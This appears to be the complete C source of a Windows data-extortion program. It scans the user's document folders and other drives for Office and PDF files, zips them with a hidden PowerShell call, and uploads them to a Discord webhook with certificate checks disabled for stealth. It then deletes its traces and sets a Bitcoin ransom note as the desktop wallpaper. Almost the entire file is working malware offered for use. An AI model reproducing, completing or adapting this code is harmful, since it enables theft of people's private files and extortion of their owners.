#include <windows.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <lmwksta.h>
#include <lmapibuf.h>
#include <winhttp.h>

#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "winhttp.lib")
#pragma warning(disable : 4996)

#define NERR_Success 0
#define MAX_QUEUE 10000

const char* validExtensions[] = {
    ".docx", ".xlsx", ".pptx", ".pdf", NULL
};

char tempFolder[MAX_PATH], zipFilePath[MAX_PATH], zipFileName[MAX_PATH];

void GenerateRandomString(char* buffer, size_t len);
void compressFolder();
void uploadToDiscord();
void scanIteratively(const char* root, int restrictUserDirs);
void createTempFolder();
void cleanupFiles();
void createRansomImage();


int main() {
    srand((unsigned int)time(NULL));
    createTempFolder();

    char drives[256];
    GetLogicalDriveStringsA(sizeof(drives), drives);
    for (char* d = drives; *d; d += strlen(d) + 1) {
        if (_stricmp(d, "C:\\") == 0) {
            char userProfile[MAX_PATH];
            if (GetEnvironmentVariableA("USERPROFILE", userProfile, sizeof(userProfile))) {
                const char* folders[] = { "\\Downloads", "\\Documents", "\\Pictures", "\\Desktop" };
                for (int i = 0; i < 4; i++) {
                    char path[MAX_PATH];
                    snprintf(path, sizeof(path), "%s%s", userProfile, folders[i]);
                    scanIteratively(path, 1);
                }
            }
            else {
                fprintf(stderr, "[-] Failed to get USERPROFILE\n");
            }
        }
        else {
            scanIteratively(d, 0);  // Full scan on non-C drives
        }
    }

    compressFolder();
    Sleep(5000);
    uploadToDiscord();
    //printf("[+] Uploaded: %s\n", zipFilePath);
    Sleep(5000);
    cleanupFiles();
    createRansomImage();
    return 0;
}



// Generate a random string
void GenerateRandomString(char* str, size_t len) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    HCRYPTPROV hCrypt;
    CryptAcquireContext(&hCrypt, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
    for (size_t i = 0; i < len; i++) {
        BYTE b;
        CryptGenRandom(hCrypt, 1, &b);
        str[i] = charset[b % (sizeof(charset) - 1)];
    }
    str[len] = 0;
    CryptReleaseContext(hCrypt, 0);
}

// Check extension
int isValidExtension(const char* filename) {
    const char* ext = PathFindExtensionA(filename);
    for (int i = 0; validExtensions[i]; i++)
        if (_stricmp(ext, validExtensions[i]) == 0) return 1;
    return 0;
}

// Copy file to temp folder
void copyFileToTemp(const char* filePath) {
    const char* fileName = strrchr(filePath, '\\');
    if (!fileName) return;
    char dest[MAX_PATH];
    snprintf(dest, sizeof(dest), "%s\\%s", tempFolder, fileName + 1);
    CopyFileA(filePath, dest, FALSE);
}

void createTempFolder() {
    char tmp[MAX_PATH], randStr[17];
    char user[UNLEN + 1], domain[DNLEN + 1];
    DWORD userLen = UNLEN + 1;

    GetTempPathA(sizeof(tmp), tmp);
    GenerateRandomString(randStr, 16);

    // Get username
    if (!GetUserNameA(user, &userLen)) strcpy(user, "Unknown");

    // Get domain
    WKSTA_INFO_100* pBuf = NULL;
    NET_API_STATUS nStatus = NetWkstaGetInfo(NULL, 100, (LPBYTE*)&pBuf);
    if (nStatus == NERR_Success && pBuf) {
        WideCharToMultiByte(CP_ACP, 0, pBuf->wki100_langroup, -1, domain, DNLEN, NULL, NULL);
        NetApiBufferFree(pBuf);
    }
    else {
        strcpy(domain, "UnknownDomain");
    }

    // Format zip name: Domain_User_Random
    snprintf(zipFileName, sizeof(zipFileName), "%s_%s_%s.zip", domain, user, randStr);

    // Build full path
    snprintf(tempFolder, sizeof(tempFolder), "%s%s", tmp, randStr);
    snprintf(zipFilePath, sizeof(zipFilePath), "%s%s", tmp, zipFileName);

    CreateDirectoryA(tempFolder, NULL);
}

void compressFolder() {
    char psCmd[MAX_PATH * 3];
    snprintf(psCmd, sizeof(psCmd),
        "powershell.exe -Command \"Compress-Archive -Path '%s\\*' -DestinationPath '%s'\"",
        tempFolder, zipFilePath);

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    if (CreateProcessA(NULL, psCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        // Wait until PowerShell finishes
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        printf("[-] Failed to start compression process\n");
    }
}


void uploadToDiscord() {
    // Read ZIP file into memory
    FILE* file = fopen(zipFilePath, "rb");
    if (!file) {
        printf("[-] Failed to open ZIP file: %s\n", zipFilePath);
        return;
    }

    fseek(file, 0, SEEK_END);
    DWORD fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    BYTE* fileData = (BYTE*)malloc(fileSize);
    if (!fileData) {
        fclose(file);
        printf("[-] Memory allocation failed\n");
        return;
    }

    fread(fileData, 1, fileSize, file);
    fclose(file);

    // Prepare WinHTTP session
    HINTERNET hSession = WinHttpOpen(L"DiscordUploader/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, NULL, NULL, 0);
    if (!hSession) {
        free(fileData);
        return;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        free(fileData);
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        L"api/webhooks/<Your_Web_Hook>",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );

    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        free(fileData);
        return;
    }

    // Ignore certificate errors (for stealth/testing only)
    DWORD flags =
        SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    // Build multipart/form-data body
    const char* boundary = "----DarkSpaceBoundary123";
    char header[256];
    snprintf(header, sizeof(header), "Content-Type: multipart/form-data; boundary=%s", boundary);

    wchar_t wHeader[256];
    mbstowcs(wHeader, header, sizeof(wHeader) / sizeof(wchar_t));

    char prefix[1024];
    snprintf(prefix, sizeof(prefix),
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
        "Content-Type: application/zip\r\n\r\n",
        boundary, zipFileName);

    char suffix[128];
    snprintf(suffix, sizeof(suffix), "\r\n--%s--\r\n", boundary);

    DWORD totalSize = strlen(prefix) + fileSize + strlen(suffix);
    BYTE* finalBody = (BYTE*)malloc(totalSize);
    if (!finalBody) {
        free(fileData);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    memcpy(finalBody, prefix, strlen(prefix));
    memcpy(finalBody + strlen(prefix), fileData, fileSize);
    memcpy(finalBody + strlen(prefix) + fileSize, suffix, strlen(suffix));

    // Send the request
    BOOL sent = WinHttpSendRequest(hRequest, wHeader, -1, finalBody, totalSize, totalSize, 0);
    if (!sent) {
        printf("[-] WinHttpSendRequest failed: %lu\n", GetLastError());
    }
    else {
        WinHttpReceiveResponse(hRequest, NULL);
        printf("[+] Uploaded via WinHTTP: %s\n", zipFilePath);
    }

    // Cleanup
    free(fileData);
    free(finalBody);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

// Shuffle queue for randomized scan order
void shuffle(char** array, int count) {
    for (int i = count - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        char* tmp = array[i];
        array[i] = array[j];
        array[j] = tmp;
    }
}

// Iterative, randomized folder traversal
void scanIteratively(const char* root, int restrictToUser) {
    char* queue[10000];
    int front = 0, rear = 0;
    queue[rear++] = _strdup(root);

    while (front < rear) {
        shuffle(queue + front, rear - front);
        char* current = queue[front++];
        WIN32_FIND_DATAA fd;
        char search[MAX_PATH];
        snprintf(search, sizeof(search), "%s\\*", current);

        HANDLE hFind = FindFirstFileA(search, &fd);
        if (hFind == INVALID_HANDLE_VALUE) {
            free(current); continue;
        }

        do {
            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
            char full[MAX_PATH];
            snprintf(full, sizeof(full), "%s\\%s", current, fd.cFileName);

            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (!restrictToUser || strstr(full, "Downloads") || strstr(full, "Documents") ||
                    strstr(full, "Pictures") || strstr(full, "Desktop")) {
                    queue[rear++] = _strdup(full);
                }
            }
            else if (isValidExtension(fd.cFileName)) {
                printf("[+] Find : %s\n", full);
                copyFileToTemp(full);
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
        free(current);
    }
}


void cleanupFiles() {
    // Delete all contents in temp folder
    char searchPath[MAX_PATH];
    snprintf(searchPath, sizeof(searchPath), "%s\\*", tempFolder);

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
                continue;

            char filePath[MAX_PATH];
            snprintf(filePath, sizeof(filePath), "%s\\%s", tempFolder, findData.cFileName);
            DeleteFileA(filePath);
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }

    // Remove temp folder
    if (!RemoveDirectoryA(tempFolder)) {
        printf("[-] Failed to remove temp folder: %s\n", tempFolder);
    }

    // Delete ZIP file
    if (!DeleteFileA(zipFilePath)) {
        printf("[-] Failed to delete ZIP: %s\n", zipFilePath);
    }
    else {
        printf("[+] Cleaned up ZIP and temp folder.\n");
    }
}



void SaveBitmapToFile(HBITMAP hBitmap, const wchar_t* filename) {
    BITMAP bmp;
    PBITMAPINFO pbmi;
    WORD cClrBits;
    HANDLE hf;
    BITMAPFILEHEADER hdr;
    PBITMAPINFOHEADER pbih;
    LPBYTE lpBits;
    DWORD dwTotal;
    DWORD cb;
    BYTE* hp;
    DWORD dwTmp;

    GetObject(hBitmap, sizeof(BITMAP), (LPSTR)&bmp);

    cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
    if (cClrBits == 1)
        cClrBits = 1;
    else if (cClrBits <= 4)
        cClrBits = 4;
    else if (cClrBits <= 8)
        cClrBits = 8;
    else if (cClrBits <= 16)
        cClrBits = 16;
    else if (cClrBits <= 24)
        cClrBits = 24;
    else
        cClrBits = 32;

    if (cClrBits != 24)
        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
            sizeof(BITMAPINFOHEADER) +
            sizeof(RGBQUAD) * (1 << cClrBits));
    else
        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
            sizeof(BITMAPINFOHEADER));

    pbih = (PBITMAPINFOHEADER)pbmi;
    pbih->biSize = sizeof(BITMAPINFOHEADER);
    pbih->biWidth = bmp.bmWidth;
    pbih->biHeight = bmp.bmHeight;
    pbih->biPlanes = bmp.bmPlanes;
    pbih->biBitCount = bmp.bmBitsPixel;
    if (cClrBits < 24)
        pbih->biClrUsed = (1 << cClrBits);

    pbih->biCompression = BI_RGB;
    pbih->biSizeImage = ((pbih->biWidth * cClrBits + 31) & ~31) / 8
        * pbih->biHeight;
    pbih->biClrImportant = 0;

    lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

    GetDIBits(GetDC(0), hBitmap, 0, (WORD)pbih->biHeight, lpBits, pbmi,
        DIB_RGB_COLORS);

    hf = CreateFileW(filename, GENERIC_READ | GENERIC_WRITE,
        (DWORD)0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
        (HANDLE)NULL);
    hdr.bfType = 0x4d42;
    hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + pbih->biSize +
        pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);
    hdr.bfReserved1 = 0;
    hdr.bfReserved2 = 0;
    hdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) +
        pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD);

    WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER),
        (LPDWORD)&dwTmp, NULL);

    WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER) +
        pbih->biClrUsed * sizeof(RGBQUAD),
        (LPDWORD)&dwTmp, (NULL));

    dwTotal = cb = pbih->biSizeImage;
    hp = lpBits;
    WriteFile(hf, (LPSTR)hp, (int)cb, (LPDWORD)&dwTmp, NULL);

    CloseHandle(hf);
    GlobalFree((HGLOBAL)lpBits);
}

void CreateTextImage(const wchar_t* text, const wchar_t* filename) {
    int width = 800;
    int height = 600;
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdc, width, height);
    SelectObject(memDC, hBitmap);

    RECT rect = { 0, 0, width, height };
    HBRUSH hBrush = CreateSolidBrush(RGB(255, 255, 255));
    FillRect(memDC, &rect, hBrush);
    DeleteObject(hBrush);

    SetTextColor(memDC, RGB(0, 0, 0));
    SetBkMode(memDC, TRANSPARENT);
    HFONT hFont = CreateFont(24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
        OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, VARIABLE_PITCH, TEXT("Arial"));
    SelectObject(memDC, hFont);

    RECT textRect = { 0, 0, width, height };
    DrawText(memDC, text, -1, &textRect, DT_CALCRECT | DT_WORDBREAK);

    if (textRect.right > width) {
        width = textRect.right + 20;
    }
    if (textRect.bottom > height) {
        height = textRect.bottom + 20;
    }

    HBITMAP newBitmap = CreateCompatibleBitmap(hdc, width, height);
    SelectObject(memDC, newBitmap);
    rect.right = width;
    rect.bottom = height;
    FillRect(memDC, &rect, hBrush);
    SelectObject(memDC, hFont);

    DrawText(memDC, text, -1, &rect, DT_CENTER | DT_WORDBREAK);

    SaveBitmapToFile(newBitmap, filename);

    DeleteObject(hFont);
    DeleteObject(newBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
}

void SetDesktopBackground(const wchar_t* filename) {
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)filename, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

void DeleteFileAfterUse(const wchar_t* filename) {
    DeleteFile(filename);
}


void createRansomImage() {
    srand((unsigned int)time(NULL));
    char bitcoin_wallet[35];
    GenerateRandomString(bitcoin_wallet, 35);
    const char* email = "dummy@email.com";
    char random_id[33];
    GenerateRandomString(random_id, 16);

    char ransom_note[512];
    snprintf(ransom_note, sizeof(ransom_note),
        "\n\n\n\nDark Space Security\n\n"
        "All your files have been exfiltrated.\n"
        "Send 1 Bitcoin to this wallet: %s\n"
        "If you want us to delete them permanently\n"
        "Contact us at: %s with this ID: %s\n",
        bitcoin_wallet, email, random_id);

    wchar_t desktop_path[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path);

    wchar_t image_path[MAX_PATH];
    swprintf(image_path, MAX_PATH, L"%s\\readme_note.bmp", desktop_path);

    wchar_t ransom_note_wstr[512];
    mbstowcs(ransom_note_wstr, ransom_note, sizeof(ransom_note_wstr) / sizeof(ransom_note_wstr[0]));
    CreateTextImage(ransom_note_wstr, image_path);

    SetDesktopBackground(image_path);

    DeleteFileAfterUse(image_path);
}
